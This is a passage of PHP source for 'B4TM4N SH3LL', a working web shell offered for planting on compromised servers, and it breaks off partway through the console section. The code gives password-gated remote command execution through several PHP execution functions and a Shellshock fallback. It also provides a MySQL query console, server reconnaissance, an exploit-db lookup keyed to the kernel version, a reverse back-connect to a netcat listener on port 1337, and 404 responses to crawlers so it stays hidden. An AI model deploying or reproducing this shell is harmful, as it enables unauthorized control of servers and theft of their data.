<?php
/* 
 * B4TM4N SH3LL is PHP Web Shell
 *
 * Feature : 
 *		[0] Interactive Console
 *		[1] PHP Reverse Back Connect
 *		[2] Build your Custom Tools
 *
*/

$config = array(
	"user"    => "azRtcHIzdA==",                             // base64_encode('user')
	"pass"    => "42b378d7eb719b4ad9c908601bdf290d541c9c3a", // sha1(md5('pass'))
	"title"   => "B4TM4N SH3LL",                             // Title
	"version" => "1.1",                                      // Version
	"debug"   => true,                                       // Debug Mode
	"demo"    => false,                                      // Demo Mode
	"info"    => true,                                       // Information
	"port"    => 1337                                        // nc -l -v -p 1337)
);

$login = <<<LOGIN
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
	<title>Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <style type="text/css">
		.vertical-offset{padding-top:15%;}
		#pageload{margin:10px auto;text-align:center}
    </style>
</head>
<body>
<div class="container">
    <div class="row vertical-offset">
    	<div class="col-md-4 col-md-offset-4">
    		<div class="panel panel-default">
			  	<div class="panel-heading">
			    	<h3 class="panel-title">Please sign in</h3>
			 	</div>
			  	<div class="panel-body">
			    	<form accept-charset="UTF-8" role="form" method='post'>
						<fieldset>
							<div class="form-group">
								<input class="form-control" placeholder="Username" name="username" maxlength="10" type="text">
							</div>
							<div class="form-group">
								<input class="form-control" placeholder="Password" name="password" maxlength="10" type="password" value="">
							</div>
							<input class="btn btn-lg btn-success btn-block" type="submit" name="login" value="Login">
						</fieldset>
			      	</form>
			    </div>
			</div>
		</div>
	</div>
</div>
</body>
</html>
LOGIN;

if ($config["debug"] == true) 
{
	error_reporting (E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
}
else
{
	error_reporting(0);
	ini_set('display_errors', 0);
	ini_set('error_log', null);
	ini_set('log_errors', 0);
	ini_set('max_execution_time', 0);
}

set_time_limit(0); // Idle Timeout
session_start();   // Session Start
ob_start();        // Prevent Double Html Request such POST & GET

$start = microtime();
$port = $config['port'];

// Disallow Bot Scanning
$bot = '/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i';
if (isset($_SERVER['HTTP_USER_AGENT']) && (preg_match($bot, $_SERVER['HTTP_USER_AGENT']))) 
{
	header("HTTP/1.0 404 Not Found");
	header("Status: 404 Not Found");
	die();
}

// Login Request
if ($_SERVER["REQUEST_METHOD"] == "POST")
{
	if (array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST) && array_key_exists("login", $_REQUEST))
	{
		if ( (base64_encode($_REQUEST['username']) == $config["user"]) && (sha1(md5($_REQUEST['password'])) == $config["pass"]) )
		{
			session_regenerate_id();
			$_SESSION['action'] = array(
				"username" => base64_encode($_REQUEST['username']),
				"password" => sha1(md5($_REQUEST['password']))
			);
			header('location: '.$_SERVER['PHP_SELF']);
		}
	}
}

if ( !array_key_exists("action", $_SESSION) )
{
	print ($login);
}
elseif ( $_SESSION['action']['username'] == $config['user'] && $_SESSION['action']['password'] == $config['pass'] )
{
?><!DOCTYPE html>
<html>
<head>
<title><?php echo $config['title'] ?></title>
<meta name='robots' content='noindex'>
<link href="data:image/png;base64,AAABAAEAEBACAAAAAACwAAAAFgAAACgAAAAQAAAAIAAAAAEAAQAAAAAAQAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAA//8AAP//AAD//wAA//8AAP7/AAD8fwAAwAcAAMAHAACMYwAADWEAAP//AAD//wAA//8AAP//AAD//wAA" rel="icon" type="image/x-icon" />
<style type="text/css">
	*{margin:0;padding:0}
	#title{text-align:center}
	#wrapper{width:89%;margin:40px auto 40px}
	#header{border-top:1px solid #111;padding-top:15px;margin-bottom:10px;padding-bottom:25px;border-bottom:1px solid #111}
	#container{}
	#content{padding:0;margin:10px 0}
	#information{display:inline-block;width:100%}
	#tools{min-height:125px;border:1px solid #111;padding:10px;border-radius:5px}
	#account{min-height:100px;border:1px solid #111;padding:10px;border-radius:5px}
	#thanks{text-align:center;font-size:16px;font-family:courier;padding:5% 0}
	#footer{margin:25px auto}
	#copyrights{text-align:center}
	#pageload{text-align:center}
	#phpinfo table {margin:25px 0}
	#phpinfo tr:nth-child(odd){background-color:black}
	#phpinfo tr:nth-child(even){background-color:#111}
	#phpinfo td, th{padding:5px;border:1px solid #111}
	#phpinfo h1 {margin:10px 0}
	#phpinfo h2 {margin:10px 0}
	#phpinfo .e {width:200px}
	#phpinfo .v {word-break:break-word;}
	#phpinfo img {display:none}
	#phpinfo hr {border:none}
	body{background:black;color:lime;font-family:monospace;font-size:13px}
	a{color:lime;text-decoration:none}
	a:hover{color:white;text-decoration:underline}
	.line h2{position:relative;top:12px;width:100px;display:inline;background:black;padding:0 10px}
	.line {border-bottom:2px solid lime;text-align:center;width:165px;margin:auto}
	.menu{overflow:hidden;border-top:1px solid #111;border-bottom:1px solid #111;margin:10px 0}
	.menu > ul{list-style:none}
	.menu > ul > li{margin:0 2px 0 0;padding:7px 10px 7px 0;display:block;float:left}
	.menu > ul > li:hover{cursor:pointer}
	.sortable thead{cursor:pointer}
	.table {width:100%;}
	.table td,th{padding:5px;border:1px solid #111}
	.table td.kanan{word-break: break-word;}
	.table td.kiri{width:30%}
	.table tr:nth-child(odd){background:black}
	.table tr:nth-child(even){background:#111}
	.new input[type=submit]{background:#111;color:#fff;border:1px solid #222;border-radius:3px;line-height:25px;padding:0px 20px;margin:10px 10px 0 0;cursor:pointer;outline:none}
	.new input[type=submit]:hover{background:#222;border:1px solid #666}
	.new input[type=text]{background:black;color:lime;width:150px;border:1px solid #111;padding:5px;margin-right:10px;outline:none;box-sizing:border-box}
	.new textarea{background:black;color:lime;width:99%;height:100px;border:1px solid #111;padding:5px;margin-right:10px;outline:none;box-sizing:border-box;}
	.new input[type=file]{background:black;color:lime;width:250px;border:1px solid #111;padding:5px;margin-right:10px;outline:none;box-sizing:border-box}
	.new select{background:black;color:lime;width:150px;border:1px solid #111;padding:5px;margin-right:2px;outline:none;box-sizing:border-box}
	.frmsource {margin-top:10px}
	.frmsource input[type=submit]{background:#111;color:#fff;border:1px solid #222;border-radius:3px;width:100px;height:25px;margin:10px 10px 0 0;cursor:pointer;outline:none}
	.frmsource input[type=submit]:hover{background:#222;border:1px solid #666}
	.frmsource textarea{background:#111;color:lime;font-family:courier;border:1px solid #111;padding:10px;width:100%;box-sizing:border-box;outline:none}
	#hexdump{height:300px;overflow:auto;overflow-x:hidden}
	.hexdump {width:100%;border:1px solid #111;padding:5px;margin-bottom:5px}
	.hexdump td{text-align:left}
	#action{margin-bottom:15px}
	.highlight{background:#fff;word-break:break-word;padding:15px;border:1px solid #111;margin-bottom:5px;height:300px;overflow:auto}
	.cmd{background:black;color:lime;width:100%;border:1px solid #111;padding:10px;outline:none;box-sizing:border-box}
	.left{float:left;width:60%}
	.right{float:right;width:40%}
	.clr{clear:both}
	.on{color:white}
	.off{color:red}
	.result{padding:10px;}
	.map{margin-bottom:10px}
	#database-query{overflow:auto;margin:10px 0;}
	#port-scan label{width:100px;padding:5px;margin-right:10px;display:inline-block}
</style>
<script type="text/javascript">
function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);else{r.$$guid||(r.$$guid=dean_addEvent.guid++),t.events||(t.events={});var o=t.events[e];o||(o=t.events[e]={},t["on"+e]&&(o[0]=t["on"+e])),o[r.$$guid]=r,t["on"+e]=handleEvent}}function removeEvent(t,e,r){t.removeEventListener?t.removeEventListener(e,r,!1):t.events&&t.events[e]&&delete t.events[e][r.$$guid]}function handleEvent(t){var e=!0;t=t||fixEvent(((this.ownerDocument||this.document||this).parentWindow||window).event);var r=this.events[t.type];for(var o in r)this.$$handleEvent=r[o],!1===this.$$handleEvent(t)&&(e=!1);return e}function fixEvent(t){return t.preventDefault=fixEvent.preventDefault,t.stopPropagation=fixEvent.stopPropagation,t}var stIsIE=!1;if(sorttable={init:function(){arguments.callee.done||(arguments.callee.done=!0,_timer&&clearInterval(_timer),document.createElement&&document.getElementsByTagName&&(sorttable.DATE_RE=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,forEach(document.getElementsByTagName("table"),function(t){-1!=t.className.search(/\bsortable\b/)&&sorttable.makeSortable(t)})))},makeSortable:function(t){if(0==t.getElementsByTagName("thead").length&&(the=document.createElement("thead"),the.appendChild(t.rows[0]),t.insertBefore(the,t.firstChild)),null==t.tHead&&(t.tHead=t.getElementsByTagName("thead")[0]),1==t.tHead.rows.length){sortbottomrows=[];for(e=0;e<t.rows.length;e++)-1!=t.rows[e].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=t.rows[e]);if(sortbottomrows){null==t.tFoot&&(tfo=document.createElement("tfoot"),t.appendChild(tfo));for(e=0;e<sortbottomrows.length;e++)tfo.appendChild(sortbottomrows[e]);delete sortbottomrows}headrow=t.tHead.rows[0].cells;for(var e=0;e<headrow.length;e++)headrow[e].className.match(/\bsorttable_nosort\b/)||(mtch=headrow[e].className.match(/\bsorttable_([a-z0-9]+)\b/),mtch&&(override=mtch[1]),mtch&&"function"==typeof sorttable["sort_"+override]?headrow[e].sorttable_sortfunction=sorttable["sort_"+override]:headrow[e].sorttable_sortfunction=sorttable.guessType(t,e),headrow[e].sorttable_columnindex=e,headrow[e].sorttable_tbody=t.tBodies[0],dean_addEvent(headrow[e],"click",sorttable.innerSortFunction=function(t){if(-1!=this.className.search(/\bsorttable_sorted\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(document.getElementById("sorttable_sortfwdind")),sortrevind=document.createElement("span"),sortrevind.id="sorttable_sortrevind",sortrevind.innerHTML=stIsIE?'&nbsp<font face="webdings">5</font>':"&nbsp;&#x25B4;",void this.appendChild(sortrevind);if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(document.getElementById("sorttable_sortrevind")),sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",void this.appendChild(sortfwdind);theadrow=this.parentNode,forEach(theadrow.childNodes,function(t){1==t.nodeType&&(t.className=t.className.replace("sorttable_sorted_reverse",""),t.className=t.className.replace("sorttable_sorted",""))}),sortfwdind=document.getElementById("sorttable_sortfwdind"),sortfwdind&&sortfwdind.parentNode.removeChild(sortfwdind),sortrevind=document.getElementById("sorttable_sortrevind"),sortrevind&&sortrevind.parentNode.removeChild(sortrevind),this.className+=" sorttable_sorted",sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",this.appendChild(sortfwdind),row_array=[],col=this.sorttable_columnindex,rows=this.sorttable_tbody.rows;for(e=0;e<rows.length;e++)row_array[row_array.length]=[sorttable.getInnerText(rows[e].cells[col]),rows[e]];row_array.sort(this.sorttable_sortfunction),tb=this.sorttable_tbody;for(var e=0;e<row_array.length;e++)tb.appendChild(row_array[e][1]);delete row_array}))}},guessType:function(t,e){sortfn=sorttable.sort_alpha;for(var r=0;r<t.tBodies[0].rows.length;r++)if(text=sorttable.getInnerText(t.tBodies[0].rows[r].cells[e]),""!=text){if(text.match(/^-?[£$¤]?[\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1]),second=parseInt(possdate[2]),first>12)return sorttable.sort_ddmm;if(second>12)return sorttable.sort_mmdd;sortfn=sorttable.sort_ddmm}}return sortfn},getInnerText:function(t){if(!t)return"";if(hasInputs="function"==typeof t.getElementsByTagName&&t.getElementsByTagName("input").length,null!=t.getAttribute("sorttable_customkey"))return t.getAttribute("sorttable_customkey");if(void 0!==t.textContent&&!hasInputs)return t.textContent.replace(/^\s+|\s+$/g,"");if(void 0!==t.innerText&&!hasInputs)return t.innerText.replace(/^\s+|\s+$/g,"");if(void 0!==t.text&&!hasInputs)return t.text.replace(/^\s+|\s+$/g,"");switch(t.nodeType){case 3:if("input"==t.nodeName.toLowerCase())return t.value.replace(/^\s+|\s+$/g,"");case 4:return t.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(var e="",r=0;r<t.childNodes.length;r++)e+=sorttable.getInnerText(t.childNodes[r]);return e.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(t){newrows=[];for(e=0;e<t.rows.length;e++)newrows[newrows.length]=t.rows[e];for(var e=newrows.length-1;e>=0;e--)t.appendChild(newrows[e]);delete newrows},sort_numeric:function(t,e){return aa=parseFloat(t[0].replace(/[^0-9.-]/g,"")),isNaN(aa)&&(aa=0),bb=parseFloat(e[0].replace(/[^0-9.-]/g,"")),isNaN(bb)&&(bb=0),aa-bb},sort_alpha:function(t,e){return t[0]==e[0]?0:t[0]<e[0]?-1:1},sort_ddmm:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},sort_mmdd:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},shaker_sort:function(t,e){for(var r=0,o=t.length-1,n=!0;n;){n=!1;for(s=r;s<o;++s)if(e(t[s],t[s+1])>0){a=t[s];t[s]=t[s+1],t[s+1]=a,n=!0}if(o--,!n)break;for(var s=o;s>r;--s)if(e(t[s],t[s-1])<0){var a=t[s];t[s]=t[s-1],t[s-1]=a,n=!0}r++}}},document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.init,!1),/WebKit/i.test(navigator.userAgent))var _timer=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.init()},10);window.onload=sorttable.init,dean_addEvent.guid=1,fixEvent.preventDefault=function(){this.returnValue=!1},fixEvent.stopPropagation=function(){this.cancelBubble=!0},Array.forEach||(Array.forEach=function(t,e,r){for(var o=0;o<t.length;o++)e.call(r,t[o],o,t)}),Function.prototype.forEach=function(t,e,r){for(var o in t)void 0===this.prototype[o]&&e.call(r,t[o],o,t)},String.forEach=function(t,e,r){Array.forEach(t.split(""),function(o,n){e.call(r,o,n,t)})};var forEach=function(t,e,r){if(t){var o=Object;if(t instanceof Function)o=Function;else{if(t.forEach instanceof Function)return void t.forEach(e,r);"string"==typeof t?o=String:"number"==typeof t.length&&(o=Array)}o.forEach(t,e,r)}};
</script>
<script type="text/javascript">
window.onload = function() {
	/* Cursor Focus */
	if(document.getElementById("cmd") !== null) document.getElementById("cmd").focus();
	if(document.getElementById("sourcefocus") !== null) document.getElementById("sourcefocus").focus();
};
function GetAjax(id,method,url) {
	document.getElementById(id).innerHTML = "Please Wait...";
	var xmlhttp;
	if (window.XMLHttpRequest) {
		xmlhttp = new XMLHttpRequest();
	} else {
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp.onreadystatechange = function() {
		if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
			document.getElementById(id).innerHTML = xmlhttp.responseText;
			return;
		}
	};
	xmlhttp.open(method, url, true);
	xmlhttp.send();
}
function GetCheck() {
	for(var i=0;i<document.files.elements.length;i++) {
		if(document.files.elements[i].type == 'checkbox') {
			document.files.elements[i].checked = document.files.elements[0].checked;
		}
	}
}
</script>
</head>
<body>
<div id="wrapper">
<?php

$dir = array_key_exists("d", $_REQUEST) ? $_REQUEST['d'] : getcwd();

function Unix() 
{
	return (strtolower(substr(PHP_OS,0,3)) == "win");
}

function Execute($x) 
{
	$x = $x . ' 2>&1';
	if (function_exists ('passthru'))
	{
		ob_start(); 		
		$passthru = passthru($x);
		$buff = ob_get_contents(); 		
		ob_end_clean(); 		
		return $buff;
	}
	else if (function_exists ('shell_exec'))
	{
		$buff = shell_exec($x);	
		return $buff;
	}
	else if (function_exists ('system'))
	{
		ob_start(); 		
		$system = system($x); 		
		$buff = ob_get_contents(); 		
		ob_end_clean();
		return $buff;
	}
	else if (function_exists ('exec'))
	{
		exec($x, $results); 		
		$buff = ""; 		
		foreach ($results as $result)
		{ 			
			$buff .= $result; 		
		}
		return $buff;
	}
	else if (function_exists ('proc_open'))
	{
		$proc = proc_open($x, array(array("pipe","r"),array("pipe","w"),array("pipe","w")), $pipes);
		$buff = stream_get_contents($pipes[1]);
		return $buff;
	}
	else if (function_exists ('popen'))
	{
		$buff = "";
		$f = popen($x,"r");
		while(!feof($f))
		{
			$buff .= fread($f,1024);
		}
		pclose($f);
		return $buff;
	}
	else if (is_link('/bin/sh'))
	{	
		if (strstr(readlink("/bin/sh"), "bash") != FALSE) 
		{
			$tmp = tempnam(".","data");
			putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
			mail("k4mpr3t@127.0.0.1","","","","-bv");
			$output = file_get_contents($tmp);
			unlink($tmp);

			if ($output != "") 
			{
				return $output;
			}
		}
		else 
		{
			return "Not vuln (not bash)";
		}
	}
	else
	{
		return "Find another way to Rome !";
	}
}

function Call($x) 
{
	if (function_exists($x)) 
	{
		return  "<font class='on'>ON</font>";
	}
	else
	{
		return "<font class='off'>OFF</font>";
	}
}

function GetFileType($x) 
{
	if (is_file($x)) 
	{ 
		return end(explode(".", $x));
	}
	elseif (is_dir($x)) 
	{ 
		return "Dir";
	}
	elseif (is_link($x)) 
	{ 
		return "Link";
	}
	else
	{
		return "-";
	}
}

function GetFileTime($x,$y) 
{
	switch($y) 
	{
		case "create":
			return date("m/d/y h:i:s", filectime($x));
			break;
		case "modify":
			return date("m/d/y h:i:s", filemtime($x));
			break;
		case "access":
			return date("m/d/y h:i:s", fileatime($x));
			break;
	}
}

function GetFilePerm($x, $y = false) 
{
	$perms = fileperms($x);
	if (($perms & 0xC000) == 0xC000) $info = 's';
	elseif (($perms & 0xA000) == 0xA000) $info = 'l';
	elseif (($perms & 0x8000) == 0x8000) $info = '-';
	elseif (($perms & 0x6000) == 0x6000) $info = 'b';
	elseif (($perms & 0x4000) == 0x4000) $info = 'd';
	elseif (($perms & 0x2000) == 0x2000) $info = 'c';
	elseif (($perms & 0x1000) == 0x1000) $info = 'p';
	else $info = 'u';
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
	return $info . ($y ? sprintf(' (%s)', substr(decoct($perms),2)) : '');
}

function GetFileSize($x) 
{
	$x = abs($x);
	$size = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $exp = $x ? floor(log($x) / log(1024)) : 0;
    return sprintf('%.2f '. $size[$exp], ($x/pow(1024, floor($exp))));
}

function GetUser($x) 
{	
	if (!function_exists('posix_getegid') && !function_exists('posix_geteuid')) 
	{
		switch ($x)
		{
			case "user":
				return get_current_user();
				break;
			case "uid":
				return getmyuid();
				break;
			case "gid":
				return getmygid();
				break;
			case "group":
				return "?";
				break;
		}
	}
	else
	{
		$uid = posix_getpwuid(posix_geteuid());
		$gid = posix_getgrgid(posix_getegid());
		
		switch ($x){
			
			case "user":
				return $uid['name'];
				break;
			case "uid":
				return $uid['uid'];
				break;
			case "gid":
				return $gid['name'];
				break;
			case "group":
				return $gid['gid'];
				break;
		}
	}	
}

function GetOwnerGroup($x) 
{
	if(!Unix())
	{
		$stat = stat($x);

	    if ($stat)
	    {
	    	if (!function_exists('posix_getegid') && !function_exists('posix_geteuid')) 
			{
		        $group = posix_getgrgid($stat[5]);
		        $user = posix_getpwuid($stat[4]);
	        	return compact('user', 'group');
	        }
	    }
	    else
	    {
	        return "No Group";
	    }
	}
	else
	{
		return "?:?";
	}
}

function MapDirectory($x) 
{

	$map = "";
	$d = str_replace("\\", DIRECTORY_SEPARATOR, $x);
	if (empty($d)){$d = realpath(".");}elseif(realpath($d)) 
	{	
		$d = realpath($d);
	}
	$d = str_replace("\\", DIRECTORY_SEPARATOR, $d);
	if (substr($d, -1) != DIRECTORY_SEPARATOR) 
	{	
		$d .= DIRECTORY_SEPARATOR;
	}
	$d = str_replace("\\\\", "\\", $d);
	$pd = $e = explode(DIRECTORY_SEPARATOR, substr($d, 0, -1));
	$i = 0;
	foreach($pd as $b) 
	{
		$t = "";
		$j = 0;
		foreach ($e as $r) 
		{
			$t.= $r.DIRECTORY_SEPARATOR;
			if ($j == $i) 
			{	
				break;
			}
			$j++;
		}
		$map .= "<a href=\"?d=".urlencode($t)."\" >". htmlspecialchars($b)."</a>". DIRECTORY_SEPARATOR;
		$i++;
	}
	return $map;
}

function MapDrive($x) 
{
	if (!Unix()) 
	{
		$v = explode("\\", $x);
		$v = $v[0];
		$l = "";
		foreach (range("A","Z") as $lt) 
		{
			$drive = is_dir($lt.":\\");
			if ($drive) 
			{
				$l .= "<a href=\"?d=".urlencode($lt.":\\")."\">[";
				if (strtolower($lt.':') != strtolower($v)) 
				{
					$l .=  $lt ; 
				}
				else
				{
					$l .=  "<font color=\"white\"><b>" . $lt . "</b></font>";
				}
				$l .= "]</a>";
			}
		}
		return $l;
	}
}

function MainMenu() 
{
	$menu = array(
		"Home"    => "?d=". urlencode(getcwd()),
		"Info"    => "?x=info",
		"Database"=> "?x=db",
		"Console" => "?x=console",
		"Connect" => "?x=connect",
		"Tools"   => "?z",
		"Account" => "?x=account",
		"logout"  => "?x=logout"
	);
	$nu = "";
	global $port;
	foreach($menu as $val => $key)
	{
		if($val == "Connect")
		{
			$nu .= "<li><a href='".$key."' onclick=\"return confirm('nc -l -v -p ".$port."');\">".$val."</a></li>" ;
		}
		else if($val == "logout")
		{
			$nu .= "<li><a href='".$key."' onclick=\"return confirm('Bye !');\">".$val."</a></li>" ;
		}
		else
		{
			$nu .= "<li><a href='".$key."'>".$val."</a></li>" ;
		}
	}
	return $nu;
}

function MenuTools($x) 
{
	global $default;
	$default = array(
		"port-scanner" => array(
			"title" => "Scan Port",
			"desc" => "Scan Port Open",
		)
	);
	$ol = "";
	$ol .= "<div class='menu'><ul>";
	$default = array_merge($default, $x);
	foreach($default as $k => $v)
	{
		$ol .= "<li><a href='?z=".$k."'>".$v['title']."</a></li>" ;
	}
	$ol .= "</ul></div>";
	return $ol;
}

function GetDisableFunction() 
{
	$stat = "";
	$disable_functions = ini_get("disable_functions");
	if(!empty($disable_functions))
	{
		$stat = "<font class='off'>$disable_functions</font>";
	}
	else
	{
		$stat = "<font class='on'>NONE</font>";
	}
	return $stat;
}

function GetSafeMode() 
{
	$stat = "";
	if (ini_get(strtolower("safe_mode")) == 'on') 
	{
		$stat = "<font class='off'>ON</font>";
	}
	else
	{
		$stat = "<font class='on'>OFF</font>";
	}
	return $stat;
}

function GetExploitDB() 
{
	$link = '//exploit-db.com/search/?action=search&filter_description=';
	if(Unix())
	{
		$link .= urlencode('Linux Kernel ' . substr(php_uname('r'),0,6));
	}
	else
	{
		$link .= urlencode(php_uname('s') . ' ' . substr(php_uname('r'),0,3));
	}
	return $link;
}

/* START INFORMATION */
if ($config['info'] == true) 
{
	$title = $config['title'];
	$version = $config['version'];

	printf("
		<div id='information'>
			<div class='left'>
				<font class='on'>[%s]</font><br>
				<font class='on'>[%s]</font><br>
				[%s]: <font class='on'>%s:%s</font> [%s]: <font class='on'>%s:%s</font><br>
				[User]: <font class='on'>%s</font> (%s) Group: <font class='on'>%s</font> (%s)<br>
				[HDD]: <font class='on'>%s</font> / <font class='on'>%s</font> [safe_mode]: %s<br>
				[disable_functions]: %s<br>
			</div>
			<div class='right'>
				<div id='header'>
					<h1 id='title'>$title</h1>
					<div class='line'>
						<h2>$version</h2>
					</div>
				</div>
			</div>
			<div class='clr'></div>
		</div>",
			php_uname(), $_SERVER['SERVER_SOFTWARE'],
			$_SERVER['SERVER_NAME'], gethostbyname($_SERVER['HTTP_HOST']), $_SERVER['SERVER_PORT'], 
			base64_decode($config['user']), $_SERVER['REMOTE_ADDR'], $_SERVER['REMOTE_PORT'], 
			GetUser('user'), GetUser('uid'), GetUser('group'), GetUser('gid'), 
			GetFileSize(disk_free_space($dir)), GetFileSize(disk_total_space($dir)), 
			GetSafeMode(), 
			GetDisableFunction()
	);
}
/* END INFORMATION */

printf("
	<div id='container'>
		
		<div class='menu'>
			<ul>%s</ul>
		</div>
		<div class='map'>
			<span style='margin-right:5px'>%s</span>%s
		</div>

		", MainMenu(), MapDrive($dir), MapDirectory($dir)
);

if(array_key_exists("x", $_REQUEST))
{
	if($_REQUEST['x'] == "logout")
	{
		session_destroy();
		session_regenerate_id();
		header('location: '.$_SERVER['PHP_SELF']);
	}
	if($_REQUEST['x'] == "info")
	{
		ob_start();
		phpinfo(INFO_ALL);
		$phpinfo = ob_get_contents();
		ob_end_clean();
		$phpinfo = preg_replace('%^.*<body>(.*)</body>.*$%ms', '$1', $phpinfo);
		printf("<div id='phpinfo'>%s</div>", $phpinfo);
	}
	if($_REQUEST['x'] == "db")
	{
		if ($config['demo'] == true)
		{
			echo "Demo Version [Change Config]";
		}
		else
		{
			if(isset($_SESSION['connect']) &&  $_SESSION['connect'] == 'true')
			{
				printf("<div id='database-query'>
							<form action='?x=db&q=db' method='post' class='new'><input type='submit' name='disconnect' value='Disconnect' /></form>
							<form action='?x=db&q=db' method='post' class='new'><br>
								<label>MYSQL Query</label> <i style='color:#222'>show databases; show tables from {database}; show columns from {database}.{table}; select * from {database}.{table};</i><br>
								<textarea name='query'>%s</textarea><br>
								<input type='submit' value='Execute' />
							</form>
						</div>", (isset($_SESSION['query']) ? $_SESSION['query'] : ''), gethostbyname($_SERVER['HTTP_HOST']));
			}
			else
			{
				printf("<div id='database'>
						<form action='?x=db&xa=db' method='post' class='new'><br>
							<label>Host</label><input type='text' name='host' value='%s'/><br>
							<label>Port</label><input type='text' name='port' value='3306'/><br>
							<label>Username</label><input type='text' name='user' value='root'/><br>
							<label>Password</label><input type='text' name='pass' value=''/><br>
							<input type='submit' value='Connect' />
						</form>
					</div>", gethostbyname($_SERVER['HTTP_HOST']));
			}

			echo "<div id='database-query'>";

			if(array_key_exists("xa", $_REQUEST) && $_REQUEST['xa'] == "db")
			{	
				$cn = @mysqli_connect($_REQUEST['host'], $_REQUEST['user'], $_REQUEST['pass'], null, $_REQUEST['port']);

				$_SESSION['host'] = $_REQUEST['host'];
				$_SESSION['port'] = $_REQUEST['port'];
				$_SESSION['user'] = $_REQUEST['user'];
				$_SESSION['pass'] = $_REQUEST['pass'];

				if($cn)
				{
					$_SESSION['connect'] = 'true';
					header('location: '.$_SERVER['PHP_SELF'].'?x=db');
				}
				else
				{
					echo 'Connection Failed';
					$_SESSION['connect'] = 'false';
				}
			}

			if(array_key_exists("q", $_REQUEST) && $_REQUEST['q'] == "db")
			{
				$sql = @mysqli_connect($_SESSION['host'], $_SESSION['user'], $_SESSION['pass'], null, $_SESSION['port']);

				if (isset($_REQUEST['disconnect']))
				{
					mysqli_close($sql);

					unset($_SESSION['connect']);
					unset($_SESSION['query']);
					unset($_SESSION['host']);
					unset($_SESSION['user']);
					unset($_SESSION['pass']);

					header('location: '.$_SERVER['PHP_SELF'].'?x=db');
				}

				$data = array();
				$query = !empty($_REQUEST['query']) ? $_REQUEST['query'] : 'show databases;';
				$result = mysqli_query($sql, $query);
				$_SESSION['query'] = $_REQUEST['query'];
				
				if($result)
				{
					while($row = mysqli_fetch_assoc($result))
					{
						$data[] = $row;
					}
				}
				else
				{
					$data = false;
				}
			
				echo "<table class='table'>";
				foreach($data as $key => $val)
				{
					if(is_array($val))
					{
						echo "<tr>";
						foreach($val as $key2 => $val2)
						{
							if (!is_array($val2))
							{
								echo "<td>". $val2 ."</td>";
							}
						}
						echo "</tr>";
					}
					
				}
				echo "</table>";
			}

			echo "</div>";
		}
	}
	if($_REQUEST['x'] == "console")
	{
		if ($config['demo'] == true)
		{
			echo "Demo Version [Change Config]";
		}
		else
		{
			$command = !empty($_REQUEST['cmd']) ? $_REQUEST['cmd'] : "whoami";
			$dir = array_key_exists("curdir", $_SESSION) ? $_SESSION['curdir'] : getcwd();
			chdir($dir);
			$charset = 'UTF-8';
			if (!Unix()) 
			{
				$charset = 'Windows-1251';
			}
			$ret = iconv($charset, 'UTF-8', Execute($command));
			$rows = count(explode(PHP_EOL, $ret));
			if ($rows < 10) 
			{
